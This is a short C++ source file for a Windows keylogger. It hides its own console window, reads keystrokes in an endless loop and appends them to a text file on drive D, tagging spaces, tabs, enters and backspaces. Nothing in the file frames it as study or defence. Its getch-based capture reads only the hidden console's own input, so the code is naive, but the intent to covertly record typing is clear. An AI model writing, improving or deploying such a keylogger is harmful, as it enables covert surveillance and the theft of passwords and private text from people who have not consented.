#include<fstream>
#include<conio.h>
#include<iostream>
#include<windows.h>
using namespace std;

int main()
{
	ofstream outfile("D:\\shobhit.txt",ios::app); 
	HWND window;
	AllocConsole();
	window=FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(window,0);
	outfile<<"---- Key logger started at -----"<<endl;
	while(1)
	{
		Sleep(20);
		char ch=getch();
		switch(ch)
		{
			case ' ': outfile<<" [Space] ";break;
			case '\t': outfile<<" [Tab] ";break;
			case '\r': outfile<<" [Enter] ";break;
			case '\b': outfile<<" [Backspace] ";break;
			default: outfile<<ch;	break;
		}
		outfile.close();
		outfile.open("D:\\shobhit.txt",ios::app); 
	}
	outfile.close();
	
}
